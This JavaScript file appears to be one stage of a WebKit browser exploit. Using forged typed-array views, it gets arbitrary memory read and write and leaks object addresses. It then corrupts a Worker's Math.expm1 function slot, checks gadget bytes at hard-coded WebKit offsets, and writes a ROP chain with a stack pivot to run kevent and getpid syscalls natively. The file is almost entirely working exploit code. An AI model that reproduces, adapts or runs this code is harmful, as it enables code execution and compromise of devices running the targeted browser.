// Worker waits in number-363 and immediately continues to number-20
// inside one native chain. Page triggers one owned user event.
// All call plans, event buffers, and the queue descriptor are restored.
return new Promise(function (resolve) {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14WorkerPlan;
  var mainPlan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  var worker = null;
  var workerUrl = null;
  var timer = null;
  var settled = false;
  var phase = "preflight";
  var restoreWorker = null;
  var heldMarker = null;
  var workerOutput = null, workerTimeout = null;
  var outputBacking = null, timeoutBacking = null;
  var outputAddress = 0, timeoutAddress = 0;
  var queueFd = -1;
  var queueRegistered = false;
  var pageInputOriginal = null;
  var triggerResult = null;
  var triggerAt = 0;
  var expectedPid = 0;
  function pageEvent(flags, fflags) {
    mainPlan.frame.fill(0,0x400,0x420);
    var view = new DataView(mainPlan.frame.buffer);
    view.setUint32(0x400,1,true);
    view.setInt16(0x408,-11,true);
    view.setUint16(0x40a,flags,true);
    view.setUint32(0x40c,fflags,true);
    view.setUint32(0x418,0x42424242,true);
  }
  function finish(status, details) {
    if (settled) return;
    settled = true;
    if (timer !== null) clearTimeout(timer);
    if (restoreWorker) {
      try {
        details.worker_restored = restoreWorker();
        if (!details.worker_restored) status = "fail";
      } catch (error) {
        details.restore_error = String(error).slice(0, 180);
        status = "error";
      }
    }
    if (worker) worker.terminate();
    if (workerUrl) URL.revokeObjectURL(workerUrl);
    var queueClean = true;
    if (queueFd >= 3 && queueFd < 1024) {
      if (queueRegistered) {
        try {
          pageEvent(2,0);
          var deleted = native.call("kevent",[queueFd,
            native.frameAddress+0x400,1,0,0,0]);
          queueClean = deleted.value === 0 && deleted.high === 0;
        } catch (error) { queueClean = false; }
      }
      try {
        var closed = native.call("close",[queueFd]);
        queueClean = queueClean && closed.value === 0 &&
          closed.high === 0;
        if (closed.value !== 0 || closed.high !== 0)
          window.__fw14QueueFd = queueFd;
      } catch (error) {
        queueClean = false;
        window.__fw14QueueFd = queueFd;
      }
    }
    if (pageInputOriginal) {
      for (var e=0;e<32;e++)
        mainPlan.frame[0x400+e]=pageInputOriginal[e];
      for (var v=0;v<32;v++)
        if (mainPlan.frame[0x400+v]!==pageInputOriginal[v])
          queueClean=false;
    }
    details.queue_cleanup=queueClean;
    if (!queueClean) status="fail";
    if (queueClean && api && typeof api.markSync === "function")
      api.markSync("wait_getpid_restored");
    heldMarker = null;
    resolve([{ id: "worker_wait_getpid_v1",
               status: status, details: details }]);
  }
  try {
    if (!state || !plan || !mainPlan || !native ||
        typeof native.call !== "function" ||
        native.frame !== mainPlan.frame ||
        !state.view || !state.array || !state.a ||
        !state.ownedTypedView || !state.calibratedViewBase ||
        state.array[0] !== state.a || !mainPlan.functionSlot ||
        !mainPlan.originalFunctionSlot || !plan.frame || !plan.stack ||
        !plan.addresses || !plan.addresses.store || !plan.addresses.frame ||
        !plan.target || !plan.webkitBase)
      throw new Error("held_view_missing");
    var forged = state.view;
    var a = state.ownedTypedView;
    var base = state.calibratedViewBase;
    if (a.length !== 65536 || a[0] !== 0x31 || a[7] !== 0xa8 ||
        !Number.isSafeInteger(base) || base % 4096 !== 0)
      throw new Error("held_view_canary_or_base_changed");
    function bytesAt(index) {
      var out = [];
      for (var i = 0; i < 8; i++) out.push(forged[index + i]);
      return out;
    }
    function integerOf(bytes) {
      var out = 0;
      for (var i = 7; i >= 0; i--) out = out * 256 + bytes[i];
      return out;
    }
    function pointerBytes(value) {
      var out = [];
      for (var i = 0; i < 8; i++)
        out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
      return out;
    }
    function addressOf(value) {
      try {
        state.array[0] = value;
        return integerOf(bytesAt(state.index));
      } finally {
        state.array[0] = state.a;
      }
    }
    var aIndex = addressOf(a) - base;
    var slot = aIndex + 8;
    if (!Number.isSafeInteger(slot) || slot < 0 || slot + 8 >= 16777216)
      throw new Error("owned_pointer_slot_outside_view");
    var original = bytesAt(slot);
    function readAt(address, length) {
      length = length || 24;
      if (length < 1 || length > 192)
        throw new Error("read_length_invalid");
      if (!Number.isSafeInteger(address) || address < 0x100000000 ||
          address >= 0x1000000000000)
        throw new Error("candidate_address_invalid");
      var next = pointerBytes(address);
      try {
        for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
        var out = [];
        for (var j = 0; j < length; j++) out.push(a[j]);
        return out;
      } finally {
        for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
      }
    }
    function writeAt(address, bytes) {
      if (!Number.isSafeInteger(address) || address < 0x100000000 ||
          address >= 0x1000000000000 || address % 8 !== 0 ||
          !bytes || bytes.length !== 8)
        throw new Error("write_target_invalid");
      var next = pointerBytes(address);
      try {
        for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
        for (var j = 0; j < 8; j++) a[j] = bytes[j];
      } finally {
        for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
      }
    }
    function same(left, right) {
      if (left.length !== right.length) return false;
      for (var i = 0; i < left.length; i++)
        if (left[i] !== right[i]) return false;
      return true;
    }
    function u32(bytes, at) {
      return (bytes[at] | (bytes[at + 1] << 8) |
              (bytes[at + 2] << 16) | (bytes[at + 3] << 24)) >>> 0;
    }
    function ptr(bytes, at) {
      return integerOf(bytes.slice(at, at + 8));
    }
    function validPointer(value) {
      return Number.isSafeInteger(value) && value >= 0x100000000 &&
             value < 0x1000000000000 && value % 8 === 0;
    }
    phase = "queue_setup";
    if (!mainPlan.frame || mainPlan.frame.length < 0x700 ||
        native.frameAddress !== mainPlan.addresses.frame ||
        plan.addresses.frame === mainPlan.addresses.frame)
      throw new Error("independent_frames_missing");
    var pidControl=native.call("getpid",[]);
    expectedPid=pidControl.value;
    if (pidControl.high!==0 || expectedPid<=0 ||
        expectedPid>=0x1000000)
      throw new Error("page_pid_control_invalid");
    pageInputOriginal = Array.from(mainPlan.frame.subarray(0x400,0x420));
    var opened = native.call("kqueue",[]);
    queueFd = opened.value;
    if (opened.high !== 0 || queueFd < 3 || queueFd >= 1024)
      throw new Error("queue_open_invalid");
    pageEvent(1,0);
    var added = native.call("kevent",[queueFd,
      native.frameAddress+0x400,1,0,0,0]);
    if (added.value !== 0 || added.high !== 0)
      throw new Error("queue_add_failed");
    queueRegistered = true;
    if (api && typeof api.markSync === "function")
      api.markSync("worker_event_preflight");
    phase = "worker_event_buffers";
    workerOutput = new Uint8Array(64);
    workerTimeout = new Uint8Array(16);
    outputBacking = new DataView(workerOutput.buffer);
    timeoutBacking = new DataView(workerTimeout.buffer);
    function dataOf(view) {
      var cell = addressOf(view);
      if (!validPointer(cell))
        throw new Error("event_buffer_cell_invalid");
      var bytes = readAt(cell,32);
      var data = ptr(bytes,16);
      if (!validPointer(data) || u32(bytes,24)!==view.length)
        throw new Error("event_buffer_vector_invalid");
      return data;
    }
    outputAddress = dataOf(workerOutput);
    timeoutAddress = dataOf(workerTimeout);
    if (outputAddress===timeoutAddress ||
        (outputAddress<timeoutAddress+16 &&
         timeoutAddress<outputAddress+64) ||
        !same(readAt(outputAddress,8),Array(8).fill(0)) ||
        !same(readAt(timeoutAddress,8),Array(8).fill(0)))
      throw new Error("event_buffer_preflight_failed");
    phase = "worker_create";
    if (typeof Worker !== "function" || typeof Blob !== "function")
      throw new Error("worker_unavailable");
    var workerSource = [
      "var marker = new Uint32Array(new ArrayBuffer(0x10));",
      "var roots = [];",
      "var leak = null, master = null, victim = null, pivot = null;",
      "self.onmessage = function (event) {",
      "  if (event.data && event.data.name === 'ping') {",
      "    self.postMessage({ id: 0, type: 'ret', value: 'pong' });",
      "    return;",
      "  }",
      "  if (event.data && event.data.name === 'fire') {",
      "    self.postMessage({ id: 3, type: 'started', at: Date.now() });",
      "    Math.expm1(pivot);",
      "    self.postMessage({ id: 3, type: 'ret', value: true, at: Date.now() });",
      "    return;",
      "  }",
      "  if (event.data && event.data.name === 'function') {",
      "    master[4] = event.data.lo >>> 0;",
      "    master[5] = event.data.hi >>> 0;",
      "    var fnLo, fnHi;",
      "    leak.value = Math.expm1;",
      "    try {",
      "      fnLo = victim.getUint32(16, true);",
      "      fnHi = victim.getUint32(20, true);",
      "      pivot = {}; roots.push(pivot);",
      "      leak.value = pivot;",
      "      var pivotLo = victim.getUint32(16, true);",
      "      var pivotHi = victim.getUint32(20, true);",
      "    } finally { leak.value = null; }",
      "    master[4] = fnLo; master[5] = fnHi;",
      "    var m16Lo = victim.getUint32(16, true);",
      "    var m16Hi = victim.getUint32(20, true);",
      "    var m24Lo = victim.getUint32(24, true);",
      "    var m24Hi = victim.getUint32(28, true);",
      "    var normal = Math.abs(Math.expm1(1) - 1.718281828459045) < 1e-12;",
      "    self.postMessage({ id: 2, type: 'ret',",
      "      value: [fnLo, fnHi, pivotLo, pivotHi,",
      "              m16Lo, m16Hi, m24Lo, m24Hi, normal] });",
      "    return;",
      "  }",
      "  leak = { value: null };",
      "  master = new Uint32Array(6);",
      "  victim = new DataView(new ArrayBuffer(48));",
      "  marker[0] = 0x7a6b5c4d; marker[1] = 0x1234cafe;",
      "  marker[2] = 0x55aa33cc; marker[3] = 0xcc33aa55;",
      "  marker.leak = leak; marker.master = master; marker.victim = victim;",
      "  roots = [marker, leak, master, victim];",
      "  self.postMessage({ id: 1, type: 'ret', value: marker }, [marker.buffer]);",
      "};"
    ].join("\n");
    workerUrl = URL.createObjectURL(new Blob([workerSource],
                                        { type: "text/javascript" }));
    worker = new Worker(workerUrl);
    timer = setTimeout(function () {
      finish("error", { phase: "worker_reply", error: "timeout" });
    }, 6000);
    worker.onerror = function (event) {
      finish("error", { phase: "worker", error: String(event.message || "worker_error").slice(0, 180) });
    };
    var pingDone = false;
    var waitingForRead = false;
    var waitingForFire = false;
    var workerSlot = 0, workerPivot = 0;
    var workerSlotOriginal = null, workerPivotOriginal = null;
    var frameOriginal = null;
    var outputOriginal = null, timeoutOriginal = null;
    var slotTouched = false, pivotTouched = false, frameTouched = false;
    var chainOriginal = null, pivotStackOriginal = null;
    var chainTouched = false, pivotStackTouched = false;
    var scratchOffset = 0x1000;
    var eventTarget = 0;
    var startedAt = 0, pageTickAt = 0;
    worker.onmessage = function (event) {
      if (settled) return;
      try {
        if (!pingDone) {
          if (!event.data || event.data.id !== 0 ||
              event.data.value !== "pong")
            throw new Error("worker_ping_mismatch");
          pingDone = true;
          worker.postMessage({ id: 1, name: "init", args: [] });
          return;
        }
        if (waitingForFire) {
          if (event.data && event.data.id === 3 &&
              event.data.type === "started") {
            startedAt = event.data.at;
            setTimeout(function () {
              if (settled) return;
              pageTickAt = Date.now();
              try {
                pageEvent(0,0x01000000);
                triggerAt=Date.now();
                triggerResult=native.call("kevent",[queueFd,
                  native.frameAddress+0x400,1,0,0,0]);
              } catch (error) {
                triggerResult={value:-999,high:0,
                  error:String(error).slice(0,90)};
              }
            }, 50);
            return;
          }
          phase = "worker_call_return";
          var fired = event.data && event.data.id === 3 &&
            event.data.type === "ret" && event.data.value === true;
          var frameView = new DataView(plan.frame.buffer);
          var waitReturn = frameView.getInt32(0, true);
          var high = frameView.getUint32(4, true);
          var chainedPid = frameView.getInt32(8, true);
          var chainedHigh = frameView.getUint32(12, true);
          var returnedAt = event.data && event.data.at;
          var elapsed = startedAt && returnedAt ?
            returnedAt - startedAt : 0;
          var triggeredDuringWait = triggerAt >= startedAt &&
            triggerAt < returnedAt && startedAt > 0;
          var guardIntact = true;
          for (var guardIndex=32;guardIndex<64;guardIndex++)
            if (workerOutput[guardIndex]!==0xa5)
              guardIntact=false;
          var eventMatched = outputBacking.getUint32(0,true)===1 &&
            outputBacking.getUint32(4,true)===0 &&
            outputBacking.getInt16(8,true)===-11;
          var triggerOk = !!triggerResult &&
            triggerResult.value===0 && triggerResult.high===0;
          finish(fired && waitReturn === 1 && high === 0 &&
                 chainedPid===expectedPid && chainedHigh===0 &&
                 elapsed < 2000 && triggeredDuringWait &&
                 triggerOk && eventMatched && guardIntact ?
                 "pass" : "fail",
                 { call_returned: fired, wait_return: waitReturn,
                   return_high: high, elapsed_ms: elapsed,
                   trigger_during_wait: triggeredDuringWait,
                   trigger_return:triggerResult ? triggerResult.value:null,
                    event_matched:eventMatched,guard_intact:guardIntact,
                    chained_pid:chainedPid,chained_high:chainedHigh });
          return;
        }
        if (waitingForRead) {
          phase = "worker_function_readback";
          var reply = event.data;
          var words = reply && reply.id === 2 &&
            reply.type === "ret" && reply.value;
          if (!Array.isArray(words) || words.length !== 9)
            throw new Error("worker_function_reply_invalid");
          var fn = words[0] + words[1] * 0x100000000;
          var pivot = words[2] + words[3] * 0x100000000;
          var m16 = words[4] + words[5] * 0x100000000;
          var m24 = words[6] + words[7] * 0x100000000;
          if (!validPointer(fn) || !validPointer(pivot) || !validPointer(m16) ||
              !validPointer(m24))
            throw new Error("worker_function_pointers_invalid");
          var slot16 = m16 + 40;
          var slot24 = m24 + 40;
          var target16 = readAt(slot16, 8);
          var target24 = readAt(slot24, 8);
          var match16 = same(target16, mainPlan.originalFunctionSlot);
          var match24 = same(target24, mainPlan.originalFunctionSlot);
          var header = readAt(pivot, 8);
          var headerOk = header.some(function (value) { return value !== 0; });
          var normal = words[8] === true;
          if (Number(match16) + Number(match24) !== 1 ||
              !headerOk || !normal)
            throw new Error("worker_call_target_preflight_failed");
          phase = "native_plan_preflight";
          var gadget = plan.webkitBase + 0x295f948;
          var code = readAt(gadget, 9);
          var expectedCode = [0x48,0x8b,0x7e,0x30,0x48,0x8b,0x07,0xff,0x10];
          if (!same(code, expectedCode) ||
              !same(readAt(plan.addresses.stack + plan.stackOffset, 8),
                    pointerBytes(plan.target)) ||
              !same(readAt(plan.addresses.store, 8),
                    Array.from(plan.store.subarray(0, 8))) ||
              Math.abs(Math.expm1(1) - 1.718281828459045) > 1e-12)
            throw new Error("native_plan_changed");
          eventTarget = plan.target - 0x850;
          var needle = [0x48,0xc7,0xc0,0x6b,1,0,0,0x49,
                        0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48];
          var pidNeedle = [0x48,0xc7,0xc0,0x14,0,0,0,0x49,
                           0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48];
          if (!same(readAt(eventTarget, 16), needle) ||
              !same(readAt(plan.target,16),pidNeedle) ||
              !same(readAt(plan.webkitBase + 0x5c480, 2), [0x5f,0xc3]) ||
              !same(readAt(plan.webkitBase + 0x6e45e, 2), [0x5e,0xc3]) ||
              !same(readAt(plan.webkitBase + 0x12c5ba, 2), [0x5a,0xc3]) ||
              !same(readAt(plan.webkitBase + 0x1bade, 2), [0x59,0xc3]) ||
              !same(readAt(plan.webkitBase + 0x9b311, 3),
                    [0x47,0x58,0xc3]) ||
              !same(readAt(plan.webkitBase + 0x1dcfb1, 3),
                    [0x47,0x59,0xc3]) ||
              !same(readAt(plan.webkitBase + 0x548b, 4),
                    [0x48,0x89,0x07,0xc3]))
            throw new Error("worker_event_code_bytes_changed");
          if (scratchOffset + 184 >= plan.stack.length ||
              scratchOffset + 184 >= plan.stackOffset ||
              plan.frame.length < 16 ||
              !validPointer(outputAddress) ||
              !validPointer(timeoutAddress))
            throw new Error("worker_event_regions_invalid");
          workerSlot = match16 ? slot16 : slot24;
          workerPivot = pivot;
          workerSlotOriginal = readAt(workerSlot, 8);
          workerPivotOriginal = header;
          frameOriginal = Array.from(plan.frame.subarray(0, 16));
          outputOriginal = Array.from(workerOutput);
          timeoutOriginal = Array.from(workerTimeout);
          chainOriginal = Array.from(plan.stack.subarray(
            scratchOffset, scratchOffset + 184));
          pivotStackOriginal = readAt(plan.addresses.pivot + 0x38, 8);
          if (!same(pivotStackOriginal,
                    pointerBytes(plan.addresses.stack + plan.stackOffset)))
            throw new Error("worker_pivot_stack_changed");
          if (!same(workerSlotOriginal, mainPlan.originalFunctionSlot))
            throw new Error("worker_slot_changed");
          if (api && typeof api.markSync === "function")
            api.markSync("wait_getpid_ready");
          phase = "worker_call_arm";
          frameTouched = true;
          plan.frame.fill(0xa5, 0, 16);
          workerOutput.fill(0xa5);
          workerTimeout.fill(0);
          timeoutBacking.setUint32(0,2,true);
          if (!same(readAt(plan.addresses.frame, 16),
                    Array(16).fill(0xa5)) ||
              !same(readAt(outputAddress,8),
                    [0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5]) ||
              timeoutBacking.getUint32(0,true) !== 2)
            throw new Error("frame_sentinel_mismatch");
          var chain = [plan.webkitBase + 0x5c480,
            queueFd,
            plan.webkitBase + 0x6e45e, 0,
            plan.webkitBase + 0x12c5ba, 0,
            plan.webkitBase + 0x1bade, outputAddress,
            plan.webkitBase + 0x9b311, 1,
            plan.webkitBase + 0x1dcfb1, timeoutAddress,
            eventTarget, plan.webkitBase + 0x5c480,
            plan.addresses.frame, plan.webkitBase + 0x548b,
            plan.target, plan.webkitBase + 0x5c480,
            plan.addresses.frame + 8, plan.webkitBase + 0x548b,
            plan.webkitBase + 0x10504, null,
            plan.webkitBase + 0x182f7];
          if (chain.length!==23 || chain[16]!==plan.target ||
              chain[21]!==null)
            throw new Error("two_call_chain_shape_invalid");
          var stackView = new DataView(plan.stack.buffer);
          chainTouched = true;
          for (var c = 0; c < chain.length; c++) {
            if (c === 21) {
              stackView.setUint32(scratchOffset + c * 8, 0x0a, true);
              stackView.setUint32(scratchOffset + c * 8 + 4,
                                  0xfffffff7, true);
            } else {
              stackView.setUint32(scratchOffset + c * 8,
                                  chain[c] >>> 0, true);
              stackView.setUint32(scratchOffset + c * 8 + 4,
                Math.floor(chain[c] / 0x100000000) >>> 0, true);
            }
          }
          pivotStackTouched = true;
          for (var q = 0; q < 8; q++)
            plan.pivot[0x38 + q] =
              pointerBytes(plan.addresses.stack + scratchOffset)[q];
          if (!same(readAt(plan.addresses.stack + scratchOffset, 184),
                    Array.from(plan.stack.subarray(
                      scratchOffset, scratchOffset + 184))) ||
              !same(readAt(plan.addresses.pivot + 0x38, 8),
                    pointerBytes(plan.addresses.stack + scratchOffset)))
            throw new Error("worker_event_chain_readback_failed");
          slotTouched = true;
          writeAt(workerSlot, pointerBytes(gadget));
          pivotTouched = true;
          writeAt(workerPivot, pointerBytes(plan.addresses.store));
          if (!same(readAt(workerSlot, 8), pointerBytes(gadget)) ||
              !same(readAt(workerPivot, 8),
                    pointerBytes(plan.addresses.store)))
            throw new Error("worker_arm_readback_failed");
          waitingForRead = false;
          waitingForFire = true;
          phase = "worker_call";
          worker.postMessage({ id: 3, name: "fire" });
          return;
        }
        phase = "transferred_marker";
        var typed = event.data && event.data.type === "ret" &&
          event.data.id === 1 && event.data.value;
        var markersOk = typed instanceof Uint32Array && typed.length === 4 &&
          typed[0] === 0x7a6b5c4d && typed[1] === 0x1234cafe &&
          typed[2] === 0x55aa33cc && typed[3] === 0xcc33aa55;
        if (!markersOk) throw new Error("transferred_marker_mismatch");
        heldMarker = typed;
        phase = "buffer_cell";
        var cell = addressOf(typed.buffer);
        if (!validPointer(cell)) throw new Error("buffer_cell_invalid");
        var cellBytes = readAt(cell);
        var impl = ptr(cellBytes, 0x10);
        if (!validPointer(impl)) throw new Error("buffer_impl_invalid");
        phase = "buffer_impl";
        var implBytes = readAt(impl);
        var data = ptr(implBytes, 0x10);
        if (!validPointer(data)) throw new Error("buffer_data_invalid");
        phase = "worker_backing";
        var backing = readAt(data);
        var backingOk = u32(backing, 0) === 0x7a6b5c4d &&
          u32(backing, 4) === 0x1234cafe &&
          u32(backing, 8) === 0x55aa33cc &&
          u32(backing, 12) === 0xcc33aa55;
        if (!backingOk) throw new Error("worker_backing_mismatch");
        phase = "storage_chain";
        var storage = ptr(backing, 0x10);
        if (!validPointer(storage)) throw new Error("storage_pointer_invalid");
        var message = ptr(readAt(storage), 8);
        if (!validPointer(message)) throw new Error("message_pointer_invalid");
        var butterfly = ptr(readAt(message), 8);
        if (!validPointer(butterfly) || butterfly < 0x100000018)
          throw new Error("butterfly_pointer_invalid");
        phase = "worker_references";
        var master = 0, victim = 0, leak = 0;
        var masterIndex = 0, victimIndex = 0, leakIndex = 0;
        var seen = 0, shapes = [];
        for (var index = 1; index <= 8; index++) {
          var candidate = ptr(readAt(butterfly - index * 8, 8), 0);
          if (!validPointer(candidate) ||
              Math.abs(candidate - cell) >= 0x40000000) continue;
          var candidateBytes = readAt(candidate, 32);
          var length = u32(candidateBytes, 24);
          var inline = ptr(candidateBytes, 16);
          seen++;
          shapes.push(index + ":" + length);
          if (!master && length === 6 && validPointer(inline)) {
            master = candidate; masterIndex = index;
          } else if (!victim && length === 48 && validPointer(inline)) {
            victim = candidate; victimIndex = index;
          } else if (!leak && u32(candidateBytes, 16) === 2 &&
                     u32(candidateBytes, 20) === 0) {
            leak = candidate; leakIndex = index;
          }
        }
        var shapeOk = !!(master && victim && leak) &&
          master !== victim && master !== leak && victim !== leak;
        if (!shapeOk) throw new Error("worker_shapes_missing");
        phase = "wire_worker";
        var masterOriginal = readAt(master + 16, 8);
        var victimOriginal = readAt(victim + 16, 8);
        if (!validPointer(ptr(masterOriginal, 0)) ||
            !validPointer(ptr(victimOriginal, 0)))
          throw new Error("worker_vectors_invalid");
        if (!same(readAt(mainPlan.functionSlot, 8),
                  mainPlan.originalFunctionSlot))
          throw new Error("main_function_slot_changed");
        var masterTouched = false;
        var victimTouched = false;
        restoreWorker = function () {
          if (slotTouched) writeAt(workerSlot, workerSlotOriginal);
          if (pivotTouched) writeAt(workerPivot, workerPivotOriginal);
          if (frameTouched) {
            for (var f = 0; f < 16; f++) plan.frame[f] = frameOriginal[f];
            for (var o = 0; o < 64; o++)
              workerOutput[o] = outputOriginal[o];
            for (var t = 0; t < 16; t++)
              workerTimeout[t] = timeoutOriginal[t];
          }
          if (chainTouched)
            for (var c = 0; c < 184; c++)
              plan.stack[scratchOffset + c] = chainOriginal[c];
          if (pivotStackTouched)
            for (var p = 0; p < 8; p++)
              plan.pivot[0x38 + p] = pivotStackOriginal[p];
          if (victimTouched) writeAt(victim + 16, victimOriginal);
          if (masterTouched) writeAt(master + 16, masterOriginal);
          var changedRestored = (!slotTouched ||
              same(readAt(workerSlot, 8), workerSlotOriginal)) &&
            (!pivotTouched ||
              same(readAt(workerPivot, 8), workerPivotOriginal)) &&
            (!frameTouched ||
              (same(readAt(plan.addresses.frame, 16), frameOriginal) &&
               same(readAt(outputAddress, 64),
                    outputOriginal) &&
               same(readAt(timeoutAddress, 16),
                    timeoutOriginal))) &&
            (!chainTouched ||
              same(readAt(plan.addresses.stack + scratchOffset, 184),
                   chainOriginal)) &&
            (!pivotStackTouched ||
              same(readAt(plan.addresses.pivot + 0x38, 8),
                   pivotStackOriginal));
          if (api && typeof api.markSync === "function")
            api.markSync("wait_getpid_call_restored");
          return changedRestored &&
            same(readAt(master + 16, 8), masterOriginal) &&
            same(readAt(victim + 16, 8), victimOriginal) &&
            a[0] === 0x31 && a[7] === 0xa8 &&
            same(bytesAt(slot), original) && state.array[0] === state.a;
        };
        masterTouched = true;
        writeAt(master + 16, pointerBytes(victim));
        if (ptr(readAt(master + 16, 8), 0) !== victim)
          throw new Error("worker_master_wire_failed");
        // The worker's indexed writes through master will retarget victim.
        victimTouched = true;
        waitingForRead = true;
        phase = "worker_function";
        worker.postMessage({ id: 2, name: "function", lo: leak >>> 0,
                             hi: Math.floor(leak / 0x100000000) >>> 0 });
      } catch (error) {
        finish("error", { phase: phase, error: String(error).slice(0, 180) });
      }
    };
    worker.postMessage({ id: 0, name: "ping", args: [] });
  } catch (error) {
    finish("error", { phase: phase, error: String(error).slice(0, 180) });
  }
});
